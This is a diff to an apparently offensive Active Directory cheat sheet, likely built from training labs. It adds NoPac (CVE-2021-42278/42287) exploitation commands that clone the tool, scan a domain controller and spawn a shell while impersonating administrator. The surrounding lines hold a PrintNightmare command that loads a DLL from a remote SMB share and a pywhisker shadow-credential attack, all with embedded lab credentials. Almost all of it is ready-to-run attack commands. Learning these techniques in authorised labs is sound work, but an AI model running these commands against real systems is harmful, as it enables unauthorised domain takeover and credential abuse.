@@ -355,6 +355,12 @@ LPVOID lpReserved ) // Reserved
 
 python3 printnightmare.py -dll '\\10.21.176.25\test\adduser.dll' 'svc-admin:management2005@10.10.211.60'
 ```
+### Domain Priviledge Escalation By NoPac CVE-2021-42278 & CVE-2021-42287
+```
+git clone https://github.com/Ridter/noPac.git
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+```
 ### Shadow Credential Attack
 ```
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
